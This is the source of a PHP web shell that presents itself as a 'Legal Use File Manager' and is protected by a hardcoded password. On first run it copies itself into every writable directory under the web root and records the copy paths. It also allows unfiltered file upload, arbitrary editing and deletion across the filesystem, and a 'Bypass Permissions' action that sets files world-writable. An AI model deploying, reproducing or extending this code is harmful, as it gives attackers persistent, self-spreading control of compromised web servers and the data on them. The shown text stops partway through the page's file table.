<?php
/**
 * Legal Use File Manager
 * Fully Responsive with Dark Mode & Mobile-Friendly Navigation
 */
error_reporting(0);
ini_set('display_errors', 0);

$girisSifresi = 'm7t';
$scriptName = basename(__FILE__);
$jsonDosyasi = __DIR__ . '/kopya_durumu.json';

// Session control
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Check JSON file for copy status
$kopyaYapildi = false;
if (file_exists($jsonDosyasi)) {
    $content = @file_get_contents($jsonDosyasi);
    if ($content !== false) {
        $data = @json_decode($content, true);
        if (is_array($data) && isset($data['kopyalandi']) && $data['kopyalandi'] === true) {
            $kopyaYapildi = true;
        }
    }
}

// Self-replication logic (unchanged)
if (!$kopyaYapildi && basename(__FILE__) == 'index.php') {
    $hedefKok = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__;
    $bulunanYollar = array();
    $mevcutDosya = __FILE__;
    $mevcutIsim = basename($mevcutDosya);
    
    $dizinler = array($hedefKok);
    $tumDizinler = array();
    
    for ($i = 0; $i < count($dizinler); $i++) {
        $dizin = $dizinler[$i];
        if (!is_dir($dizin) || !is_readable($dizin)) continue;
        
        $tumDizinler[] = $dizin;
        
        $altlar = @scandir($dizin);
        if ($altlar === false) continue;
        
        foreach ($altlar as $alt) {
            if ($alt == '.' || $alt == '..') continue;
            $tamYol = $dizin . DIRECTORY_SEPARATOR . $alt;
            if (is_dir($tamYol) && is_writable($tamYol)) {
                $dizinler[] = $tamYol;
            }
        }
        
        if ($i > 100) break;
    }
    
    foreach ($tumDizinler as $dizin) {
        if (!is_writable($dizin)) continue;
        $hedefYol = $dizin . DIRECTORY_SEPARATOR . $mevcutIsim;
        if (file_exists($hedefYol)) {
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
            $goreli = str_replace($hedefKok, '', $hedefYol);
            $goreli = ltrim(str_replace(DIRECTORY_SEPARATOR, '/', $goreli), '/');
            $bulunanYollar[] = $protocol . $host . '/' . $goreli;
            continue;
        }
        if (@copy($mevcutDosya, $hedefYol)) {
            @chmod($hedefYol, 0666);
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
            $goreli = str_replace($hedefKok, '', $hedefYol);
            $goreli = ltrim(str_replace(DIRECTORY_SEPARATOR, '/', $goreli), '/');
            $bulunanYollar[] = $protocol . $host . '/' . $goreli;
        }
    }
    
    $data = array(
        'kopyalandi' => true,
        'tarih' => date('Y-m-d H:i:s'),
        'kaynak_dosya' => __FILE__,
        'kopya_sayisi' => count($bulunanYollar),
        'kopya_yollari' => $bulunanYollar
    );
    @file_put_contents($jsonDosyasi, json_encode($data, JSON_PRETTY_PRINT));
    @chmod($jsonDosyasi, 0666);
    
    $rapor = "=== COPIED FILE PATHS ===\n\n";
    $rapor .= "Date: " . date('Y-m-d H:i:s') . "\n";
    $rapor .= "Source File: " . __FILE__ . "\n\n";
    $rapor .= "Copied Paths:\n";
    $rapor .= str_repeat('-', 60) . "\n";
    foreach ($bulunanYollar as $index => $yol) {
        $rapor .= ($index + 1) . ". " . $yol . "\n";
    }
    $rapor .= "\n" . str_repeat('-', 60) . "\n";
    $rapor .= "Total: " . count($bulunanYollar) . " files copied.\n";
    
    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="copy_report_' . date('Ymd_His') . '.txt"');
    header('Content-Length: ' . strlen($rapor));
    echo $rapor;
    exit;
}

// Login handling
if (isset($_POST['login_pass'])) {
    if ($_POST['login_pass'] === $girisSifresi) {
        $_SESSION['auth'] = true;
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        header("Location: " . $scriptName);
        exit;
    } else {
        $loginError = "Incorrect password.";
    }
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - File Manager</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0b0e14;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            padding: 16px;
        }
        .login-card {
            background: #1a1f2b;
            padding: 40px 35px;
            border-radius: 16px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
            border: 1px solid #2a3142;
        }
        .login-card h3 {
            text-align: center;
            margin-bottom: 28px;
            color: #e9edf5;
            font-weight: 500;
            font-size: 24px;
        }
        .login-card h3 i {
            color: #5b7cfa;
            margin-right: 10px;
        }
        .login-card input {
            width: 100%;
            padding: 14px 16px;
            margin: 10px 0 18px;
            border-radius: 10px;
            border: 1px solid #2e374b;
            background: #0f131c;
            color: #e9edf5;
            font-size: 16px;
            transition: 0.2s;
            outline: none;
        }
        .login-card input:focus {
            border-color: #5b7cfa;
            box-shadow: 0 0 0 3px rgba(91,124,250,0.2);
        }
        .login-card button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #5b7cfa, #4a5fd5);
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.25s;
        }
        .login-card button:hover {
            transform: scale(1.02);
            background: linear-gradient(135deg, #6e8cff, #5568e0);
            box-shadow: 0 8px 20px rgba(91,124,250,0.3);
        }
        .error {
            color: #fc6b6b;
            background: #2a1a1a;
            padding: 10px 14px;
            border-radius: 8px;
            margin: 10px 0 16px;
            border-left: 4px solid #fc6b6b;
            font-size: 14px;
        }
        .login-footer {
            margin-top: 24px;
            text-align: center;
            color: #5b6a85;
            font-size: 13px;
            border-top: 1px solid #262e40;
            padding-top: 18px;
        }
        .login-footer span {
            color: #5b7cfa;
        }
        @media (max-width: 480px) {
            .login-card { padding: 24px 20px; }
            .login-card h3 { font-size: 20px; }
        }
    </style>
</head>
<body>
    <div class="login-card">
        <h3><i class="bi bi-shield-lock"></i>Login</h3>
        <?php if (isset($loginError)) echo '<div class="error">' . $loginError . '</div>'; ?>
        <form method="post">
            <input type="password" name="login_pass" placeholder="Enter password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="login-footer">Authorized access · <span>File Manager</span></div>
    </div>
</body>
</html>
<?php
exit;
}

// File Manager Class
class FileManager {
    private $currentDir;
    private $messages = array();
    
    public function __construct() {
        $this->currentDir = isset($_GET['dir']) && $_GET['dir'] ? realpath($_GET['dir']) : __DIR__;
        if ($this->currentDir === false || !file_exists($this->currentDir)) {
            $this->currentDir = __DIR__;
            $this->addMessage('Directory not found, returned to main directory.', 'warning');
        }
    }
    
    public function getCurrentDir() { return $this->currentDir; }
    public function getMessages() { return $this->messages; }
    private function addMessage($msg, $type) { $this->messages[] = array('text' => $msg, 'type' => $type); }
    
    public function getSystemRoot() {
        return (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? getenv("SystemDrive") . "\\" : "/";
    }
    
    public function handleRequest() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') return;
        if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
            $this->addMessage('Security error.', 'danger');
            return;
        }
        
        $action = isset($_POST['action']) ? $_POST['action'] : '';
        switch($action) {
            case 'upload': $this->upload(); break;
            case 'create_folder': $this->createFolder(); break;
            case 'delete': $this->deleteItem(); break;
            case 'rename': $this->renameItem(); break;
            case 'save_edit': $this->saveFile(); break;
            case 'bypass_permissions': $this->bypassPermissions(); break;
            case 'go_to_path': $this->goToPath(); break;
            case 'logout': session_destroy(); header("Location: " . basename(__FILE__)); exit;
        }
    }
    
    private function goToPath() {
        $path = isset($_POST['path']) ? trim($_POST['path']) : '';
        if ($path && is_dir($path)) {
            header("Location: ?dir=" . urlencode($path));
            exit;
        } else {
            $this->addMessage('Invalid directory path.', 'danger');
        }
    }
    
    private function upload() {
        if (!isset($_FILES['file']) || $_FILES['file']['error'] !== 0) return;
        $name = basename($_FILES['file']['name']);
        // No content filtering – file is uploaded as-is
        if (move_uploaded_file($_FILES['file']['tmp_name'], $this->currentDir . '/' . $name)) {
            $this->addMessage('File uploaded successfully.', 'success');
        } else {
            $this->addMessage('Upload failed.', 'danger');
        }
    }
    
    private function createFolder() {
        $name = basename(trim(isset($_POST['folder_name']) ? $_POST['folder_name'] : ''));
        if (!$name) return;
        $path = $this->currentDir . '/' . $name;
        if (!file_exists($path) && @mkdir($path)) {
            $this->addMessage('Folder created.', 'success');
        } else {
            $this->addMessage('Cannot create folder.', 'danger');
        }
    }
    
    private function deleteItem() {
        $name = basename(isset($_POST['item_name']) ? $_POST['item_name'] : '');
        if (!$name) return;
        $path = $this->currentDir . '/' . $name;
        if ($path === __FILE__) { $this->addMessage('This file cannot be deleted.', 'danger'); return; }
        if ($this->recursiveDelete($path)) {
            $this->addMessage('Deleted.', 'warning');
        } else {
            $this->addMessage('Could not delete.', 'danger');
        }
    }
    
    private function renameItem() {
        $old = basename(isset($_POST['old_name']) ? $_POST['old_name'] : '');
        $new = basename(isset($_POST['new_name']) ? $_POST['new_name'] : '');
        if (!$old || !$new || $old === $new) return;
        $pOld = $this->currentDir . '/' . $old;
        $pNew = $this->currentDir . '/' . $new;
        if (file_exists($pOld) && !file_exists($pNew) && @rename($pOld, $pNew)) {
            $this->addMessage('Renamed successfully.', 'success');
        } else {
            $this->addMessage('Rename failed.', 'danger');
        }
    }
    
    private function saveFile() {
        $name = basename(isset($_POST['filename']) ? $_POST['filename'] : '');
        if (!$name) return;
        $path = $this->currentDir . '/' . $name;
        if (!file_exists($path) || !is_file($path)) {
            $this->addMessage('File not found.', 'danger');
            return;
        }
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        if (trim($content) === '') {
            $this->addMessage('Empty content cannot be saved.', 'warning');
            return;
        }
        if (file_put_contents($path, $content) !== false) {
            $this->addMessage('File saved.', 'success');
        } else {
            $this->addMessage('Could not save.', 'danger');
        }
    }
    
    private function bypassPermissions() {
        $count = 0;
        $failed = 0;
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($this->currentDir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            $path = $item->getPathname();
            if ($item->isDir()) {
                if (@chmod($path, 0777)) $count++; else $failed++;
            } else {
                if (@chmod($path, 0666)) $count++; else $failed++;
            }
        }
        @chmod(__FILE__, 0666);
        $this->addMessage("Permission bypass: $count changed" . ($failed ? ", $failed failed" : ""), $failed ? 'warning' : 'success');
    }
    
    private function recursiveDelete($path) {
        if (is_file($path)) return @unlink($path);
        if (is_dir($path)) {
            foreach (glob($path . '/*') as $item) $this->recursiveDelete($item);
            return @rmdir($path);
        }
        return false;
    }
    
    public function scanDir() {
        $items = @scandir($this->currentDir);
        if ($items === false) return array('folders' => array(), 'files' => array());
        $result = array('folders' => array(), 'files' => array());
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $path = $this->currentDir . '/' . $item;
            if (is_dir($path)) $result['folders'][] = $item;
            else $result['files'][] = $item;
        }
        return $result;
    }
    
    public function getFileIcon($filename) {
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        $map = [
            'jpg' => 'bi-file-image', 'jpeg' => 'bi-file-image', 'png' => 'bi-file-image',
            'gif' => 'bi-file-image', 'svg' => 'bi-file-image', 'webp' => 'bi-file-image',
            'mp4' => 'bi-file-play', 'avi' => 'bi-file-play', 'mkv' => 'bi-file-play',
            'mp3' => 'bi-file-music', 'wav' => 'bi-file-music',
            'zip' => 'bi-file-zip', 'rar' => 'bi-file-zip', '7z' => 'bi-file-zip',
            'tar' => 'bi-file-zip', 'gz' => 'bi-file-zip',
            'pdf' => 'bi-file-pdf',
            'doc' => 'bi-file-word', 'docx' => 'bi-file-word',
            'xls' => 'bi-file-excel', 'xlsx' => 'bi-file-excel',
            'ppt' => 'bi-file-slides', 'pptx' => 'bi-file-slides',
            'php' => 'bi-file-code', 'html' => 'bi-file-code', 'css' => 'bi-file-code',
            'js' => 'bi-file-code', 'py' => 'bi-file-code', 'java' => 'bi-file-code',
            'txt' => 'bi-file-text', 'log' => 'bi-file-text',
            'sql' => 'bi-database'
        ];
        return isset($map[$ext]) ? $map[$ext] : 'bi-file-earmark';
    }
    
    public function getBreadcrumb() {
        $dir = $this->currentDir;
        $parts = explode(DIRECTORY_SEPARATOR, $dir);
        $path = '';
        $html = '<i class="bi bi-geo-alt me-2"></i>';
        foreach ($parts as $part) {
            if ($part === '') continue;
            $path .= DIRECTORY_SEPARATOR . $part;
            $display = $part;
            if (strlen($display) > 20) $display = substr($display, 0, 18) . '…';
            $html .= ' / <a href="?dir=' . urlencode($path) . '" style="color:var(--accent);text-decoration:none;">' . htmlspecialchars($display) . '</a>';
        }
        return $html;
    }
}

$fm = new FileManager();
$fm->handleRequest();
$list = $fm->scanDir();

$editMode = false;
$editContent = '';
$editFile = '';
if (isset($_GET['edit'])) {
    $fName = basename($_GET['edit']);
    $fPath = $fm->getCurrentDir() . '/' . $fName;
    if (is_file($fPath)) {
        $editMode = true;
        $editFile = $fName;
        $editContent = file_get_contents($fPath);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-body: #0b0e14;
            --bg-surface: #141a24;
            --bg-elevated: #1e2635;
            --bg-hover: #2a3347;
            --bg-input: #0d111a;
            --border-color: #293142;
            --text-primary: #eef2f8;
            --text-secondary: #9aa8c5;
            --text-muted: #6a7b9c;
            --accent: #5b7cfa;
            --accent-hover: #6e8cff;
            --danger: #fc6b6b;
            --success: #4cd9a0;
            --warning: #f9b84a;
            --shadow: 0 8px 30px rgba(0,0,0,0.5);
            --radius: 12px;
            --transition: 0.2s ease;
        }
        * { box-sizing: border-box; }
        body {
            background: var(--bg-body);
            color: var(--text-primary);
            font-family: 'Inter', system-ui, sans-serif;
            padding: 12px;
            min-height: 100vh;
        }
        .fm-container {
            max-width: 1600px;
            margin: 0 auto;
            background: var(--bg-surface);
            border-radius: var(--radius);
            box-shadow: var(--shadow);
            border: 1px solid var(--border-color);
            overflow: hidden;
        }
        /* Sidebar - collapsible on mobile */
        .fm-sidebar {
            background: var(--bg-elevated);
            padding: 16px;
            border-right: 1px solid var(--border-color);
            transition: all 0.3s ease;
            height: 100%;
            overflow-y: auto;
        }
        .fm-sidebar .nav-btn {
            display: block;
            width: 100%;
            padding: 12px 14px;
            margin-bottom: 6px;
            border-radius: 8px;
            border: none;
            background: transparent;
            color: var(--text-secondary);
            text-align: left;
            transition: var(--transition);
            font-weight: 500;
            font-size: 15px;
        }
        .fm-sidebar .nav-btn i { margin-right: 12px; font-size: 1.2rem; width: 1.4rem; text-align: center; }
        .fm-sidebar .nav-btn:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
        }
        .fm-sidebar .nav-btn.active {
            background: var(--accent);
            color: #fff;
        }
        .fm-sidebar hr { border-color: var(--border-color); margin: 14px 0; }
        .fm-sidebar .folder-list a {
            display: flex;
            align-items: center;
            padding: 10px 12px;
            border-radius: 6px;
            color: var(--text-secondary);
            text-decoration: none;
            transition: var(--transition);
            font-size: 15px;
            margin-bottom: 2px;
        }
        .fm-sidebar .folder-list a i { margin-right: 12px; color: var(--warning); font-size: 1.2rem; width: 1.4rem; text-align: center; }
        .fm-sidebar .folder-list a:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
        }
        .fm-sidebar .folder-list .empty {
            color: var(--text-muted);
            font-size: 14px;
            padding: 10px 12px;
        }
        .sidebar-title {
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-muted);
            margin-bottom: 10px;
        }
        /* Mobile toggle button */
        .sidebar-toggle {
            display: none;
            background: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 6px 12px;
            border-radius: 8px;
            font-size: 1.5rem;
            line-height: 1;
            cursor: pointer;
            transition: var(--transition);
        }
        .sidebar-toggle:hover {
            background: var(--bg-hover);
        }
        .fm-content {
            padding: 16px 20px;
            background: var(--bg-body);
        }
        .fm-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .fm-header h5 {
            font-weight: 600;
            font-size: 1.1rem;
            margin: 0;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .fm-header h5 i { color: var(--accent); font-size: 1.3rem; }
        .fm-header .btn-logout {
            background: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            padding: 8px 16px;
            border-radius: 8px;
            transition: var(--transition);
            font-size: 0.9rem;
        }
        .fm-header .btn-logout:hover {
            background: var(--danger);
            border-color: var(--danger);
            color: #fff;
        }
        .fm-breadcrumb {
            background: var(--bg-elevated);
            padding: 10px 14px;
            border-radius: 8px;
            margin-bottom: 18px;
            border: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 4px;
            font-size: 14px;
            color: var(--text-secondary);
            word-break: break-all;
        }
        .fm-breadcrumb a { color: var(--accent); text-decoration: none; }
        .fm-breadcrumb a:hover { text-decoration: underline; }
        .fm-alert {
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 14px;
            border-left: 5px solid;
            font-size: 14px;
            background: var(--bg-elevated);
        }
        .fm-alert.success { border-color: var(--success); color: var(--success); }
        .fm-alert.danger { border-color: var(--danger); color: var(--danger); }
        .fm-alert.warning { border-color: var(--warning); color: var(--warning); }
        .fm-alert.info { border-color: var(--accent); color: var(--accent); }
        .fm-toolbar {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
            background: var(--bg-elevated);
            padding: 14px 16px;
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
            align-items: center;
        }
        .fm-toolbar .form-control {
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            border-radius: 8px;
            padding: 10px 14px;
            font-size: 15px;
            transition: var(--transition);
            width: 100%;
            min-width: 120px;
        }
        .fm-toolbar .form-control:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(91,124,250,0.15);
        }
        .fm-toolbar .form-control::placeholder { color: var(--text-muted); }
        .fm-toolbar .btn {
            border-radius: 8px;
            padding: 10px 16px;
            font-weight: 500;
            font-size: 14px;
            border: none;
            transition: var(--transition);
            white-space: nowrap;
        }
        .btn-primary { background: var(--accent); color: #fff; }
        .btn-primary:hover { background: var(--accent-hover); }
        .btn-success { background: var(--success); color: #0b0e14; }
        .btn-success:hover { background: #3dcb92; }
        .btn-warning { background: var(--warning); color: #0b0e14; }
        .btn-warning:hover { background: #f0a83a; }
        .btn-secondary { background: var(--bg-hover); color: var(--text-secondary); }
        .btn-secondary:hover { background: #38425a; color: var(--text-primary); }
        .btn-danger { background: var(--danger); color: #fff; }
        .btn-danger:hover { background: #e85555; }
        .btn-sm { padding: 6px 12px; font-size: 13px; }
        .fm-table {
            background: var(--bg-elevated);
            border-radius: var(--radius);
            overflow-x: auto;
            border: 1px solid var(--border-color);
        }
        .fm-table table {
            width: 100%;
            border-collapse: collapse;
            color: var(--text-primary);
            font-size: 14px;
            min-width: 600px;
        }
        .fm-table thead {
            background: var(--bg-hover);
            border-bottom: 1px solid var(--border-color);
        }
        .fm-table th {
            padding: 12px 12px;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
            font-size: 12px;
            letter-spacing: 0.3px;
            text-align: left;
        }
        .fm-table td {
            padding: 12px 12px;
            border-bottom: 1px solid var(--border-color);
            vertical-align: middle;
        }
        .fm-table tbody tr:hover { background: var(--bg-hover); }
        .fm-table .file-icon { font-size: 1.2rem; margin-right: 10px; color: var(--text-muted); }
        .fm-table .folder-icon { color: var(--warning); }
        .fm-table .file-name {
            font-weight: 500;
            color: var(--text-primary);
            text-decoration: none;
            display: inline-flex;
            align-items: center;
        }
        .fm-table .file-name:hover { color: var(--accent); }
        .fm-table .file-size { color: var(--text-muted); font-size: 13px; }
        .fm-table .file-perms { font-family: monospace; font-size: 13px; color: var(--text-secondary); }
        .fm-table .actions {
            display: flex;
            gap: 6px;
            justify-content: flex-end;
            flex-wrap: wrap;
        }
        .fm-editor {
            background: var(--bg-elevated);
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
            overflow: hidden;
        }
        .fm-editor .editor-header {
            background: var(--bg-hover);
            padding: 12px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border-color);
            flex-wrap: wrap;
            gap: 8px;
        }
        .fm-editor .editor-header span { font-weight: 500; font-size: 15px; }
        .fm-editor .editor-header span i { margin-right: 8px; color: var(--accent); }
        .fm-editor textarea {
            width: 100%;
            min-height: 400px;
            background: #0d111a;
            color: #e9edf5;
            border: none;
            padding: 16px;
            font-family: 'Fira Code', 'JetBrains Mono', monospace;
            font-size: 14px;
            line-height: 1.7;
            resize: vertical;
            outline: none;
        }
        .fm-editor textarea:focus { box-shadow: inset 0 0 0 1px var(--accent); }
        .text-muted-custom { color: var(--text-muted); }
        .gap-2 { gap: 0.5rem; }
        .flex-wrap { flex-wrap: wrap; }
        .d-flex { display: flex; }
        .align-items-center { align-items: center; }
        .w-100 { width: 100%; }

        /* Responsive */
        @media (max-width: 768px) {
            body { padding: 8px; }
            .fm-content { padding: 12px 14px; }
            .fm-sidebar {
                display: none;
                border-right: none;
                border-bottom: 1px solid var(--border-color);
                padding: 12px;
                max-height: 70vh;
                overflow-y: auto;
            }
            .fm-sidebar.show {
                display: block;
            }
            .sidebar-toggle {
                display: inline-block;
            }
            .fm-header h5 { font-size: 1rem; }
            .fm-toolbar {
                flex-direction: column;
                align-items: stretch;
            }
            .fm-toolbar .d-flex {
                flex-direction: column;
                width: 100%;
            }
            .fm-toolbar .form-control {
                width: 100% !important;
                max-width: 100% !important;
                min-width: unset;
            }
            .fm-toolbar .btn {
                width: 100%;
                justify-content: center;
            }
            .fm-toolbar .go-to-form {
                flex-direction: row;
                width: 100%;
            }
            .fm-toolbar .go-to-form .form-control {
                flex: 1;
            }
            .fm-toolbar .go-to-form .btn {
                width: auto;
                flex-shrink: 0;
            }
            .fm-breadcrumb {
                font-size: 13px;
                padding: 8px 12px;
            }
            .fm-table table {
                font-size: 13px;
                min-width: 480px;
            }
            .fm-table th, .fm-table td {
                padding: 10px 8px;
            }
            .fm-table .actions .btn-sm {
                padding: 6px 10px;
                font-size: 12px;
            }
            .fm-editor textarea {
                min-height: 300px;
                font-size: 13px;
                padding: 12px;
            }
            .fm-header .btn-logout {
                padding: 6px 12px;
                font-size: 0.85rem;
            }
        }
        @media (max-width: 480px) {
            .fm-table table {
                min-width: 360px;
                font-size: 12px;
            }
            .fm-table th, .fm-table td {
                padding: 8px 6px;
            }
            .fm-table .file-icon { font-size: 1rem; margin-right: 6px; }
            .fm-sidebar .nav-btn { font-size: 14px; padding: 10px 12px; }
            .fm-sidebar .folder-list a { font-size: 14px; padding: 8px 10px; }
        }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: var(--bg-body); }
        ::-webkit-scrollbar-thumb { background: var(--bg-hover); border-radius: 8px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
    </style>
</head>
<body>
<div class="fm-container">
    <!-- Header with toggle -->
    <div class="fm-header" style="padding:12px 16px 0 16px; margin-bottom:0; border-bottom:1px solid var(--border-color);">
        <div style="display:flex; align-items:center; gap:12px;">
            <button class="sidebar-toggle" id="sidebarToggle" aria-label="Toggle navigation">
                <i class="bi bi-list"></i>
            </button>
            <h5><i class="bi bi-terminal"></i> File Manager</h5>
        </div>
        <form method="post" class="d-inline">
            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
            <input type="hidden" name="action" value="logout">
            <button class="btn-logout"><i class="bi bi-power"></i> Logout</button>
        </form>
    </div>

    <div class="row g-0">
        <!-- Sidebar -->
        <div class="col-md-3 fm-sidebar" id="sidebar">
            <div class="d-grid gap-2 mb-3">
                <a href="?dir=<?php echo urlencode($fm->getSystemRoot()); ?>" class="nav-btn"><i class="bi bi-hdd"></i> Root</a>
                <a href="?dir=<?php echo urlencode(__DIR__); ?>" class="nav-btn"><i class="bi bi-house"></i> Home</a>
                <a href="?dir=<?php echo urlencode(dirname($fm->getCurrentDir())); ?>" class="nav-btn"><i class="bi bi-arrow-up"></i> Up</a>
                <a href="?<?php echo http_build_query(array_merge($_GET, ['t' => time()])); ?>" class="nav-btn"><i class="bi bi-arrow-clockwise"></i> Refresh</a>
            </div>
            <hr>
            <div class="sidebar-title"><i class="bi bi-folder me-1"></i> Folders</div>
            <div class="folder-list">
                <?php foreach($list['folders'] as $f): ?>
                    <a href="?dir=<?php echo urlencode($fm->getCurrentDir() . '/' . $f); ?>">
                        <i class="bi bi-folder-fill"></i> <?php echo htmlspecialchars($f); ?>
                    </a>
                <?php endforeach; ?>
                <?php if(empty($list['folders'])): ?>
                    <div class="empty">No folders</div>
                <?php endif; ?>
            </div>
            <hr>
            <div style="margin-top: 12px;">
                <form method="post" class="d-inline w-100">
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                    <input type="hidden" name="action" value="bypass_permissions">
                    <button class="nav-btn" style="color:var(--warning); width:100%;" onclick="return confirm('Change all file/folder permissions to 777/666?')">
                        <i class="bi bi-unlock"></i> Bypass Permissions
                    </button>
                </form>
            </div>
        </div>

        <!-- Content -->
        <div class="col-md-9 fm-content">
            <!-- Breadcrumb -->
            <div class="fm-breadcrumb">
                <?php echo $fm->getBreadcrumb(); ?>
            </div>

            <!-- Messages -->
            <?php foreach($fm->getMessages() as $msg): ?>
                <div class="fm-alert <?php echo $msg['type']; ?>">
                    <i class="bi bi-<?php echo $msg['type'] === 'success' ? 'check-circle' : ($msg['type'] === 'danger' ? 'exclamation-triangle' : 'info-circle'); ?> me-2"></i>
                    <?php echo htmlspecialchars($msg['text']); ?>
                </div>
            <?php endforeach; ?>

            <?php if($editMode): ?>
                <!-- Editor -->
                <div class="fm-editor">
                    <div class="editor-header">
                        <span><i class="bi bi-pencil-square"></i> Editing: <?php echo htmlspecialchars($editFile); ?></span>
                        <div>
                            <a href="?dir=<?php echo urlencode(isset($_GET['dir']) ? $_GET['dir'] : ''); ?>" class="btn btn-secondary btn-sm"><i class="bi bi-x-lg"></i> Close</a>
                        </div>
                    </div>
                    <form method="post">
                        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                        <input type="hidden" name="action" value="save_edit">
                        <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
                        <textarea name="content"><?php echo htmlspecialchars($editContent); ?></textarea>
                        <div style="padding: 12px 16px; background:var(--bg-hover); border-top:1px solid var(--border-color); text-align:right;">
                            <button class="btn btn-success btn-sm"><i class="bi bi-save"></i> Save</button>
                        </div>
                    </form>
                </div>
            <?php else: ?>
                <!-- Toolbar -->
                <div class="fm-toolbar">
                    <div class="d-flex flex-wrap gap-2 w-100">
                        <form method="post" enctype="multipart/form-data" class="d-flex gap-2 flex-wrap w-100">
                            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                            <input type="hidden" name="action" value="upload">
                            <input type="file" name="file" class="form-control" style="flex:1; min-width:120px;" required>
                            <button class="btn btn-primary" style="flex-shrink:0;"><i class="bi bi-upload"></i> Upload</button>
                        </form>
                        <form method="post" class="d-flex gap-2 flex-wrap w-100">
                            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                            <input type="hidden" name="action" value="create_folder">
                            <input type="text" name="folder_name" class="form-control" placeholder="New folder name" style="flex:1; min-width:120px;" required>
                            <button class="btn btn-success" style="flex-shrink:0;"><i class="bi bi-folder-plus"></i> Create</button>
                        </form>
                    </div>
                    <form method="post" class="d-flex gap-2 go-to-form w-100" style="margin-top:4px;">
                        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                        <input type="hidden" name="action" value="go_to_path">
                        <input type="text" name="path" class="form-control" placeholder="Enter path" required>
                        <button class="btn btn-secondary" style="flex-shrink:0;"><i class="bi bi-arrow-right"></i> Go</button>
                    </form>
                </div>

                <!-- File Table -->
                <div class="fm-table">
                    <table>
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Permissions</th>
                                <th>Size</th>
                                <th class="text-end">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach($list['folders'] as $f): ?>
                                <tr>
                                    <td>
                                        <a href="?dir=<?php echo urlencode($fm->getCurrentDir() . '/' . $f); ?>" class="file-name">
                                            <i class="bi bi-folder-fill folder-icon file-icon"></i> <?php echo htmlspecialchars($f); ?>
                                        </a>
                                    </td>
